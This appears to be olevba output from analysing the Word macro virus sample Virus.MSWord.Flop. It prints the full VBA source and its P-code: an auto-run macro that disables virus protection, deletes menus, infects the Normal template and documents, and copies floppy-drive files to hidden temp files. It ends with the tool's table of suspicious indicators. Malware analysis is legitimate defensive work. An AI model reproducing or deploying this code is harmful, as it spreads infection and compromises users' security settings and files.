olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Flop
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Flop - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'VBACopyFloppy
Option Explicit
Private Declare Function GetDriveType Lib "kernel32" Alias "GetDriveTypeA" (ByVal nDrive As String) As Long
Private Declare Function GetTempPath Lib "kernel32" Alias "GetTempPathA" (ByVal nBufferLength As Long, ByVal lpBuffer As String) As Long
Private Declare Function CopyFile Lib "kernel32" Alias "CopyFileA" (ByVal lpExistingFileName As String, ByVal lpNewFileName As String, ByVal bFailIfExists As Long) As Long
Private Declare Function GetTempFileName Lib "kernel32.dll" Alias "GetTempFileNameA" (ByVal lpszPath As String, ByVal lpPrefixString As String, ByVal wUnique As Long, ByVal lpTempFileName As String) As Long

Private Sub Document_Open()
Dim i As Long, s1 As String * 256, s2 As String
On Error Resume Next
Application.EnableCancelKey = 0
With Options: .ConfirmConversions = 0: .VirusProtection = 0: .SaveNormalPrompt = 0: End With
CommandBars.FindControl(, 30017).Delete
For i = 1 To CommandBars(29).Controls.Count: CommandBars(29).Controls(1).Delete: Next
For i = 1 To CommandBars(9).Controls.Count: CommandBars(9).Controls(1).Delete: Next
For i = 1 To CommandBars(6).Controls.Count: CommandBars(6).Controls(1).Delete: Next
If NormalTemplate.VBProject.VBComponents(1).CodeModule.Lines(1, 1) <> MacroContainer.VBProject.VBComponents(1).CodeModule.Lines(1, 1) Then
    NormalTemplate.VBProject.VBComponents(1).CodeModule.DeleteLines 1, NormalTemplate.VBProject.VBComponents(1).CodeModule.CountOfLines
    NormalTemplate.VBProject.VBComponents(1).CodeModule.AddFromString MacroContainer.VBProject.VBComponents(1).CodeModule.Lines(1, MacroContainer.VBProject.VBComponents(1).CodeModule.CountOfLines)
    NormalTemplate.Save
ElseIf ActiveDocument.VBProject.VBComponents(1).CodeModule.Lines(1, 1) <> MacroContainer.VBProject.VBComponents(1).CodeModule.Lines(1, 1) Then
    With ActiveDocument
        .VBProject.VBComponents(1).CodeModule.DeleteLines 1, .VBProject.VBComponents(1).CodeModule.CountOfLines
        .VBProject.VBComponents(1).CodeModule.AddFromString MacroContainer.VBProject.VBComponents(1).CodeModule.Lines(1, MacroContainer.VBProject.VBComponents(1).CodeModule.CountOfLines)
        If Dir(.FullName) <> "" Then .SaveAs .FullName, wdWordDocument
        .Saved = True
    End With
End If
If GetDriveType(Mid(ActiveDocument.FullName, 1, 2)) = 2 Then
    s2 = s1
    GetTempPath 256, s1
    With Application.FileSearch
        .FileName = "*.*"
        .LookIn = Mid(ActiveDocument.FullName, 1, 3)
        .SearchSubFolders = True
        .Execute
        For i = 1 To .FoundFiles.Count: GetTempFileName s1, "~~", 0, s2: CopyFile .FoundFiles(i), s2, 0: SetAttr s2, 7: Next
    End With
End If
End Sub

-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Flop
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 9748 bytes
' Line #0:
' 	QuoteRem 0x0000 0x000D "VBACopyFloppy"
' Line #1:
' 	Option  (Explicit)
' Line #2:
' 	FuncDefn (Private Declare Function GetDriveType Lib "kernel32" (ByVal nDrive As String) As Long)
' Line #3:
' 	FuncDefn (Private Declare Function GetTempPath Lib "kernel32" (ByVal nBufferLength As Long, ByVal lpBuffer As String) As Long)
' Line #4:
' 	FuncDefn (Private Declare Function CopyFile Lib "kernel32" (ByVal lpExistingFileName As String, ByVal lpNewFileName As String, ByVal bFailIfExists As Long) As Long)
' Line #5:
' 	FuncDefn (Private Declare Function GetTempFileName Lib "kernel32.dll" (ByVal lpszPath As String, ByVal lpPrefixString As String, ByVal wUnique As Long, ByVal lpTempFileName As String) As Long)
' Line #6:
' Line #7:
' 	FuncDefn (Private Sub Document_Open())
' Line #8:
' 	Dim 
' 	VarDefn i (As Long)
' 	LitDI2 0x0100 
' 	VarDefn s1
' 	VarDefn s2 (As String)
' Line #9:
' 	OnError (Resume Next) 
' Line #10:
' 	LitDI2 0x0000 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #11:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	MemStWith ConfirmConversions 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	MemStWith VirusProtection 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	MemStWith SaveNormalPrompt 
' 	BoS 0x0000 
' 	EndWith 
' Line #12:
' 	ParamOmitted 
' 	LitDI2 0x7541 
' 	Ld CommandBars 
' 	ArgsMemLd FindControl 0x0002 
' 	ArgsMemCall Delete 0x0000 
' Line #13:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x001D 
' 	ArgsLd CommandBars 0x0001 
' 	MemLd Controls 
' 	MemLd Count 
' 	For 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	LitDI2 0x001D 
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' 	BoS 0x0000 
' 	StartForVariable 
' 	Next 
' Line #14:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0009 
' 	ArgsLd CommandBars 0x0001 
' 	MemLd Controls 
' 	MemLd Count 
' 	For 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	LitDI2 0x0009 
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' 	BoS 0x0000 
' 	StartForVariable 
' 	Next 
' Line #15:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0006 
' 	ArgsLd CommandBars 0x0001 
' 	MemLd Controls 
' 	MemLd Count 
' 	For 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	LitDI2 0x0006 
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' 	BoS 0x0000 
' 	StartForVariable 
' 	Next 
' Line #16:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld MacroContainer 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Ne 
' 	IfBlock 
' Line #17:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #18:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld MacroContainer 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	LitDI2 0x0001 
' 	Ld MacroContainer 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #19:
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #20:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld MacroContainer 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Ne 
' 	ElseIfBlock 
' Line #21:
' 	StartWithExpr 
' 	Ld ActiveDocument 
' 	With 
' Line #22:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	MemLdWith VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	LitDI2 0x0001 
' 	MemLdWith VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #23:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld MacroContainer 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	LitDI2 0x0001 
' 	Ld MacroContainer 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitDI2 0x0001 
' 	MemLdWith VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #24:
' 	MemLdWith FullName 
' 	ArgsLd Dir 0x0001 
' 	LitStr 0x0000 ""
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	MemLdWith FullName 
' 	Ld wdWordDocument 
' 	ArgsMemCallWith SaveAs 0x0002 
' 	EndIf 
' Line #25:
' 	LitVarSpecial (True)
' 	MemStWith Saved 
' Line #26:
' 	EndWith 
' Line #27:
' 	EndIfBlock 
' Line #28:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	LitDI2 0x0001 
' 	LitDI2 0x0002 
' 	ArgsLd Mid$ 0x0003 
' 	ArgsLd GetDriveType 0x0001 
' 	LitDI2 0x0002 
' 	Eq 
' 	IfBlock 
' Line #29:
' 	Ld s1 
' 	St s2 
' Line #30:
' 	LitDI2 0x0100 
' 	Ld s1 
' 	ArgsCall GetTempPath 0x0002 
' Line #31:
' 	StartWithExpr 
' 	Ld Application 
' 	MemLd FileSearch 
' 	With 
' Line #32:
' 	LitStr 0x0003 "*.*"
' 	MemStWith FileName 
' Line #33:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	LitDI2 0x0001 
' 	LitDI2 0x0003 
' 	ArgsLd Mid$ 0x0003 
' 	MemStWith LookIn 
' Line #34:
' 	LitVarSpecial (True)
' 	MemStWith SearchSubFolders 
' Line #35:
' 	ArgsMemCallWith Execute 0x0000 
' Line #36:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	MemLdWith FoundFiles 
' 	MemLd Count 
' 	For 
' 	BoS 0x0000 
' 	Ld s1 
' 	LitStr 0x0002 "~~"
' 	LitDI2 0x0000 
' 	Ld s2 
' 	ArgsCall GetTempFileName 0x0004 
' 	BoS 0x0000 
' 	Ld i 
' 	ArgsMemLdWith FoundFiles 0x0001 
' 	Ld s2 
' 	LitDI2 0x0000 
' 	ArgsCall CopyFile 0x0003 
' 	BoS 0x0000 
' 	Ld s2 
' 	LitDI2 0x0007 
' 	ArgsCall SetAttr 0x0002 
' 	BoS 0x0000 
' 	StartForVariable 
' 	Next 
' Line #37:
' 	EndWith 
' Line #38:
' 	EndIfBlock 
' Line #39:
' 	EndSub 
' Line #40:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|CopyFile            |May copy a file                              |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |kernel32.dll        |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

